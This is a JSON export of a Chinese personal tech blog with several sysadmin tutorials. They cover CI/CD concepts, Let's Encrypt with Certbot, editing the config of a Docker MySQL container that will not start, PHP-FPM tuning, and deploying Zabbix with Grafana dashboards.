也不仅仅是一种软件的部署方法。它通过一种全新的方式，来思考如何让软件的作者（开发部门）和运营者（运营部门）进行合作与协同。使用了DevOps模型之后，会使两个部门更好的交互。其中，自动化部署的概念就是从中产生的。 什么是 CI/CD？Gitlab 的CI/CD到底是什么呢？ 昨天大致了解了下 Gitlab CI/CD，不是很明白，但觉得很厉害。首先来看下官方文档的简介： 软件开发的连续方法基于自动执行脚本，以最大限度地减少在开发应用程序时引入错误的可能性。从新代码的开发到部署，它们需要较少的人为干预甚至根本不需要干预。它涉及在每次小迭代中不断构建，测试和部署代码更改，从而减少基于有缺陷或失败的先前版本开发新代码的机会。 这里有三种主要的方法，根据最适合你的策略进行选择。 持续集成考虑一个应用程序，其代码存储在Gitlab中的存储库中。开发人员每天多次推送代码更改，对于每次推动到存储库，都可以创建一组脚本来自动构建和测试应用程序，从而减少向应用程序引入错误的可能性。这种方法被称为：持续集成（Continuous Integration） 持续交付持续交付 Continuous Delivery是持续集成的一个步骤，应用程序不仅在推送到代码库的每个代码更改时都构建和测试，而且作为一个额外的步骤，它也会连续部署，尽管部署是手动触发的。 持续部署持续部署 Continuous Deployment也是持续集成的又一步，类似于持续交付。不同之处在于，不必手动部署应用程序，而是将其设置为自动部署。完全不需要人工干预就可以部署应用程序。 什么是 K8S？参考链接 什么是DevOps？–程序员小灰 DevOps 到底是什么？ 使用GitLab介绍CI / CD Gitlab CI/CD 快速入门 Gitlab CI/CD 入门 Gitlab CI 示例 Docker 集成 Git Runner 是什么？ 安装Gitlab Runner 什么是 Auto DevOps K8S 是什么？知乎 为什么 K8S 很酷 K8S 中文指南 一文了解 K8S 是什么？","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.0x2beace.com/tags/DevOps/"},{"name":"K8S","slug":"K8S","permalink":"https://www.0x2beace.com/tags/K8S/"}]},{"title":"如何自动申请免费的SSL 证书","slug":"how-to-automatically-apply-for-a-free-ssl-certificate","date":"2020-09-11T08:18:20.000Z","updated":"2020-12-21T13:39:01.225Z","comments":true,"path":"how-to-automatically-apply-for-a-free-ssl-certificate/","link":"","permalink":"https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/","excerpt":"上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。","text":"上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。 Let’s Encrypt 是一个免费提供的SSL 证书的CA，虽然每次签发的有效期都只有三个月，但是发证是自动化的，发证速度较快，并且可以通过脚本来自动续签，为个人网站使用HTTPS提供了一个不错的选择。 Let’s Encrypt （以下简称LE）的证书签发主要使用基于 ACME协议 的证书自动管理客户端来实现。 LE官方推荐的客户端是 Certbot ，本文中就是使用 Certbot 来获取和续签证书。 LE 是如何自动签发证书的假设现在要申请CA 证书的域名是 example.com。 首先由WebServer（也就是我们用户端的服务器）的管理客户端（如Certbot）发送请求到LE，让LE来验证客户端是否真的控制example.com这个域名，接下来LE会提出一些验证动作（原文challenges），比如让客户端在一个很明显的路径上放指定的文件。同时，LE还会发出一个随机数，客户端需要用这个随机数和客户端自己的私钥来进行签名。 WebServer上的客户端完成LE指定的域名验证动作并且将加密后的签名后，再次发送请求到LE要求验证，LE会验证发回来的签名是否正确，并且验证域名验证动作是否完成，如下载指定的文件并且判断文件里面的内容是否符合要求。 这些验证都完成以后，可以申请证书了。 完成验证后，客户端生成自己的私钥以及 Certificate Signing Request（CSR） 发送到LE服务器，LE服务器会将CA证书（也是公钥）发放到你的服务器。 这样就完成了CA证书的自动化发放了。 使用Certbot 获取证书LE 的CA 证书发放原理看着还挺麻烦的，但如果使用 Certbot 客户端，整个过程还是挺简单的。 在正式获取证书之前，推荐先去Certbot 官网选择适合自己的系统环境。 我这边系统环境是Nginx + Ubuntu 18.04 LTS，所以下面介绍的安装流程只适用于Ubuntu + Nginx。 1. 安装 snapsnap 是Canonical公司发布的全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。使用snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理。但是由此带来的问题就是它占用更多的磁盘空间。 12$ sudo apt update$ sudo apt install snapd 2. 安装 certbot在安装 Certbot 之前，最好先移除历史快照。 1$ sudo apt-get remove certbot 进行安装： 1$ sudo snap install --classic certbot 3. 生成证书安装完成之后，下一步需要做的就是生成证书了，这里有两种方式： 生成证书并自动配置 1$ sudo certbot --nginx 生成证书手动配置 1$ sudo certbot certonly --nginx 我选择的是手动配置，大概流程如下： 输入常用邮箱，用来接收通知和恢复密钥。 同意使用协议。 输入需要做授权的域名，多个域名用空格隔开。 等待验证通过。 需要注意的是： certbot会自动检测本地Nginx 的可用域名（没有配置server_name 的域名不会被检测到） 如果其中某个域名验证失败，则不会生成密钥及证书 一切正常的话，可以看到/etc/letsencrypt/live/your_sites/目录下多了四个文件： cert.pem ： 公钥，服务器证书 chain.pem ： 中间证书 fullchain.pem ： 前两个的合集 privkey.pem ： 私钥 其中配置Nginx SSL 只需要用到fullchain.pem 和privkey.pem： 123456789server &#123; listen 443 ssl; server_name www.example.com; ssl on; ssl_certificate &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.exampl.com&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem; ...&#125; 至此，就已经完成了生成证书到配置的全部过程了。 自动续签如果快要到期了，可以使用certbot renew对证书进行更新，需要注意的是，如果证书尚未过期，则不会更新。 可以配合conrtab使用，每半个月的凌晨三点自动续签一次。 1$ 0 3 15 * * certbot renew 参考链接 Let’s Encrypt免费SSL证书获取以及自动续签","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"}]},{"title":"当 Docker 容器无法正常启动时如何修改配置文件","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1","date":"2020-09-10T13:12:13.000Z","updated":"2020-09-10T13:13:32.922Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","excerpt":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？","text":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？ 这种情况下，有两种方式去修改：2. Docker 容器的配置文件一般在 /var/lib/docker/overlay/目录下，可以找到该目录下对应的配置文件进行修改。2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。 方式一 查询日志 123456docker logs &lt;容器名称&#x2F;容器id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting 由于异常日志可以得知是因为我将relay-log 写成了 realy 导致容器无法正常启动。 查找文件 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。 修改配置文件 重启容器即可。 方式二如果第一种方式没生效，那可以尝试第二种方式。 复制容器中的配置文件到主机： 123# 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf 修改主机中的配置文件 将该配置文件mv 到容器中： 123# 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 重启配置文件即可。 总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。 参考链接 Docker修改无法启动的容器的配置文件","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"Zabbix 快速上手——添加监控项","slug":"zabbix-quick-start-add-monitoring-items","date":"2020-09-09T13:50:15.000Z","updated":"2020-09-09T13:51:50.880Z","comments":true,"path":"zabbix-quick-start-add-monitoring-items/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/","excerpt":"在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。 下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。","text":"在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。 下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。 至于更好的方式是怎样的，暂时还没有发现。 添加监控项打开Configuration-&gt;Hosts 主机页面，点击需要监控项的主机的 Application。 在Application列表中，如果没有看到 Network interfaces这一项，那么可以点击右上角的Create Appliction自己创建。 创建完成之后，items 默认是没有的，需要我们自己添加，继续点击items-&gt;create items。 接下来是最重要的一步，添加监控项的具体信息。 需要注意的地方有下面几个： Name：自定义该项监控的名称 Key：net.if.in[eth0,bytes]，其中eth0并不是固定的，这个具体的值是被监控得主机得实际网卡。 Units：bps Update interval：自动更新时间，这个可以自定义。 Applications：选择 Network interfaces 如何确定网卡地址？ 进入服务器，输入ifconfig命令查看，通常排在最前面得就是实际网卡。 完成之后，点击Add添加监控项。 如果一切顺利的话，可以在刚才添加的监控项列表中看到监控项状态是启用的。 这个时候已经可以看到该监控项相关的数据了，如果希望在Grafana 中展示，那么只需要在选择Application时，选择Network interfaces就好了。 结合Grafana，最后的效果大概是这样： 这里只是举了一个典型的例子来了解Zabbix 如何手动添加监控项，其他类型的数据也是通过类似的方式进行添加。 参考链接 zabbix监控网络的出入口流量 Cannot find information for this network interface in /proc/net/dev","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Zabbix + Grafana 打造高颜值的分布式监控平台","slug":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform","date":"2020-09-08T13:08:25.000Z","updated":"2020-09-08T13:09:34.991Z","comments":true,"path":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","link":"","permalink":"https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","excerpt":"在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。 所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。 Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。","text":"在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。 所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。 Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。 Grafana 是什么？ Grafana是一个跨平台的开源度量分析和可是化的工具，可以通过该将采集的数据查询然后可视化的展示，并及时通知。 Grafana 有以下特点： 展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式. 数据源：Graphite、InfluxDB、OpenTSDB、Prometheus、Elasticsearch、CloudWatch和KairosDb、Zabbix等。 通知提醒：以可视方式定义最重要指标的报警规则，Grafana将不断计算并发送通知，在数据达到预设阈值时通过slack，PagerDuty等处理通知。 混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源。 注释：使用来自不同数据源的丰富事件来展示图表，将鼠标悬停在事件上会显示完整的事件元数据和标记。 过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。 安装Grafana 的安装还是建议根据自己实际的系统环境去官网选择适合自己的下载链接。 比如我的环境是 Ubuntu 18.04，我想安装 Grafana 7.0，所以我的安装方式应该是： 123$ sudo apt-get install -y adduser libfontconfig1$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb$ sudo dpkg -i grafana_7.0.0_amd64.deb 启动服务以守护进程的方式启动 grafana-server： 12$ sudo systemctl daemon-reload$ sudo systemctl start grafana-server 设置开机启动： 1$ sudo systemctl enable grafana-server.service 查看 grafana-server所监听的端口： 12$ sudo netstat -lntptcp6 0 0 :::3000 :::* LISTEN 17194&#x2F;grafana-serve 3000 是Grafana 默认监听端口，然后通过浏览器访问 http://your_ip_address:3000 即可。 正常应该可以看到该页面，如果你能看到3000 端口被监听，但是页面一直打不开，那可能是因为防火墙没有允许3000 端口。 默认的用户名和密码都是：admin，登录之后记得第一时间修改默认密码。 安装Zabbix 插件打开Grafana 的插件列表，找到Zabbix。 这里根据实实际情况，选择对应的版本。 通过grafana-cli 安装zabbix 插件，将下面这行代码放在安装了 Grafana 的服务器上执行： 12$ grafana-cli plugins install alexanderzobnin-zabbix-app✔ Installed alexanderzobnin-zabbix-app successfully 安装完成之后，重启Grafana： 1$ sudo systemctl restart grafana-server 然后打开Grafana 的Web 界面，在插件列表中找到 Zabbix。 点击启用。 add data source自从 Grafana 7.0 以后，没有签名的插件默认在 datasource 中是不可见的… 坑啊，最初我安装的是 Zabbix5.0，然后看见Grafana 7.0 好像只适配4.0，心想完了，该不会出现什么版本不兼容的问题吧？ 结果在add data source这一步，一直找不到 zabbix… 然后今天把5.0 完全卸载了，重新装回了4.0，结果到了add data source这一步才发现，还是找不到zabbix，当时心态就崩了… 直到我看见这篇文章，这么重要的信息，官方文档中居然没记录。 如果你无法访问，也可以直接进行修改： 1234# vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini# 添加一行allow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource 然后重启Grafana： 1$ sudo systemctl restart grafana-server 再次打开Web 页面，现在就能找到 Zabbix 了。 配置 data source只用修改以下四个地方就好了，然后点击保存。 add dashboard依次点击add dashboard-&gt; add new panel，然后按照以下方式配置，就可以选择展示自己想要的数据了。 最后的效果： 这里只是介绍了 Zabbix + Grafana 最基础的用法，能看到的数据也是最简单的一些，如果想看到更多的数据，那就得更加了解 Zabbix 了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"当 Docker 容器无法正常启动时如何修改配置文件？","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally","date":"2020-09-07T00:13:24.000Z","updated":"2020-09-07T00:14:53.536Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","excerpt":"在容器无法正常启动的情况下，如何修改其配置文件？","text":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？ 这种情况下，有两种方式去修改：2. Docker 容器的配置文件一般在 /var/lib/docker/overlay/目录下，可以找到该目录下对应的配置文件进行修改。2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。 方式一 查询日志 123456docker logs &lt;容器名称&#x2F;容器id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting 由于异常日志可以得知是因为我将relay-log 写成了 realy 导致容器无法正常启动。 查找文件 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。 修改配置文件 重启容器即可。 方式二如果第一种方式没生效，那可以尝试第二种方式。 复制容器中的配置文件到主机： 123# 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf 修改主机中的配置文件 将该配置文件mv 到容器中： 123# 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 重启配置文件即可。 总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。 参考链接 Docker修改无法启动的容器的配置文件","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP-FPM 配置初始化","slug":"php-fpm-configuration-initialization","date":"2020-09-06T03:57:11.000Z","updated":"2020-09-06T04:05:33.658Z","comments":true,"path":"php-fpm-configuration-initialization/","link":"","permalink":"https://www.0x2beace.com/php-fpm-configuration-initialization/","excerpt":"php-fpm（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 ngx_fastcgi_modul模块对接，用来处理动态请求。","text":"php-fpm（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 ngx_fastcgi_modul模块对接，用来处理动态请求。 初始化当安装了PHP 之后，可以从以下三个方向来对默认配置进行修改，以达到优化的效果。 1. 核心配置文件核心配置文件其实就是 php.ini，该配置文件的作用通常是用来启用或禁用第三方模块，及修改PHP 时区等。 123# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inidate.timezone &#x3D; Asia&#x2F;Shanghai 2. 全局配置文件全局配置文件php-fpm.conf，通常用来配置一些辅助性功能。 123456# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conferror_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.loglog_level &#x3D; notice;process_max &#x3D; 0deamonize &#x3D; yes 参数解析： error_log：错误日志路径 log_level：日志级别，默认为notice alert：必须立即处理 error：错误情况 warning：警告情况 notice：一般重要信息 debug：调试信息 process_max：控制最大子进程数的全局变量，不建议设置具体数量，因为会限制扩展配置。 daemonize：是否开启守护进程，默认为yes 通常不会在php-fpm.conf中设定 process_max，因为会限制www.conf中的配置。 3. 扩展配置文件扩展配置文件www.conf通常是与php-fpm服务相关的配置，大部分优化都是需要更改这个配置文件。 123456789101112# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conflisten &#x3D; 127.0.0.1:9000slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log# 这里按照10G 的空闲内存去设定pm &#x3D; dynamicpm.start_servers &#x3D; 16pm.max_children &#x3D; 256pm.min_spare_servers &#x3D; 16pm.max_spare_servers &#x3D; 32pm.max_requests &#x3D; 1000 参数解析： listen：有两种方式可以进行通讯。 socket：unix:/run/php/php7.3-fpm.sock http：127.0.0.1:9000 因为php-fpm与ngx_fastcgi_modul的通讯方式是 9000端口，所以默认是 127.0.0.1:9000 slowlog：慢查询日志路径 pm：进程管理方式 static：静态模式。始终保持固定数量的子进程数，配合最大子进程数一起使用，这个方式很不灵活，通常不是默认。 pm.max_children：最大子进程数。 dynamic：动态模式。按照固定的最小子进程数启动，同时用最大子进程数去限制。 pm.start_servers：默认开启的进程数 pm.min_spare_servers：最小空闲的进程数 pm.max_spare_servers：最大空闲的进程数 pm.max_children：最大子进程数 pm.max_requests：每个进程能响应的请求数量，达到此限制之后，该PHP 进程就会被自动释放掉。 nodaemonize：每个进程在闲置一定时候后就会被杀掉。 pm.max_children：最大子进程数 pm.process_idle_timeout：在多少秒之后，一个空闲的进程将会被杀死 注意：max_children 是 PHPFPM Pool 最大的子进程数，它的数值取决于服务器实际空闲内存。假设你有一台10G 运行内存的服务器，我们知道一个空闲的PHP 进程占用的是 1M 内存，而一个正在处理请求的PHP 进程 大概会占用10M-40M内存，这里按照每个PHP 请求占用 40M 内存，那么max_children = 10*1024M/40M = 256，所以这个值得根据实际环境而设定。 以上就是php-fpm 初始化配置的核心部分了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"Zabbix 快速上手——部署","slug":"zabbix-quick-start","date":"2020-09-05T00:49:02.000Z","updated":"2020-12-06T15:14:35.561Z","comments":true,"path":"zabbix-quick-start/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start/","excerpt":"因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。比如：监控系统。 本着不想当运维的前端不是一个好全栈的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。","text":"因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。比如：监控系统。 本着不想当运维的前端不是一个好全栈的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。 我希望这套监控系统是怎样的？ 免费开源 入门相对容易 支持多平台分布式监控 综合以上需求，最后我选择了 Zabbix 。 网上找了一圈，并没有发现合适的入门教程，要么是教程太老了，要么是写的不够详细，学习曲线很陡，光是部署就很费劲，而Zabbix 重要的不是部署，而是学会如何使用。 所以这篇笔记就是用来记录如何快速部署 Zabbix。 认识 ZabbixZabbix 是一个企业级的分布式开源监控方案。 一个完整的监控系统是由服务机（zabbix server）和客户机（zabbix zgent）组成，运行大概流程是这样的： zabbix agent 需要安装到被监控的主机上，它负责定期收集各项数据，并发送到 zabbix server 端，zabbix server将数据存储到自己的数据库中，zabbix web根据数据在前端进行展现和绘图。这里 agent 收集数据分为主动和被动两种模式： 主动：agent 请求server 获取主动的监控项列表，并主动将监控项内需要检测的数据提交给 server/proxy 。 被动：server 向agent请求获取监控项的数据，agent返回数据。 工作原理： 安装系统环境： Ubuntu 18.04 LTS Mysql 5.7 PHP 7.2 Nginx Zabbix 5.0 1. 安装数据库在正式安装之前，这里推荐先去官网找到符合自己的 Zabbix 服务器平台。 根据自己的实际环境来找到属于自己的下载链接，比如我是Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginx，所以我的安装方式应该是： 123$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update 2. 安装Zabbix server，Web前端，agent1$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent Zabbix Server：用来接收并处理 Zabbix agent 传过来的数据 Web 前端：Zabbix 的交互界面 Zabbix agent：需要被监控的主机 3. 初始数据库安装完数据库之后，并不能直接登录，因为不知道root 用户的密码，所以需要重置root 用户的密码，重置的方式有多种，这里推荐我常使用的的一种。 123456# vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf # 也许你编辑的配置文件和我的名称不一样，不过没关系。# 添加下面两行配置[mysqld]skip-grant-tables 重启Mysql 服务： 1$ service mysql restart 现在的root 用户已经没有密码了，所以下一步要做的就是修改root 用户密码： 123$ mysql -hlocalhost -uroot -pmysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;; 然后再次修改刚才的配置文件，将下面那行配置给注释掉， 最后重启Mysql 服务就可以了。 Mysql 默认用户是root，这里不推荐直接使用 root 用户去管理 zabbix 数据库，所以还是使用官方推荐的方式，创建一个新的用户去管理： 1234567$ mysql -hlocalhost -uroot -pmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;mysql&gt; flush privileges;mysql&gt; quit; 这里默认Mysql 是运行在本地机器上，如果Mysql 运行在容器中，而Zabbix 又运行在本机上，可能会出现一些异常（我遇到了但没能解决）。 导入初始架构和数据。 1$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix 4. 配置数据库为Zabbix server配置数据库， 123# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.confDBPassword&#x3D;password 5. 配置Web12345# vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf# 去掉前面的注释，换成你自己的端口或者域名。# listen 80;# server_name example.com; 6. 配置时区123# vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.confphp_value[date.timezone] &#x3D; Asia&#x2F;Shanghai 7. 启动服务启动Zabbix server和agent 进程，并为它们设置开机自启： 12$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm 一切准备就绪之后，就可以访问了：http://server_ip_or_name，如果你上面配置的不是80 端口，那得记得加上对应的端口。如果你不能正常访问，那可能是因为防火墙没有允许该端口。 初次进来，需要配置相关参数，确认无误之后，点击 Next step。 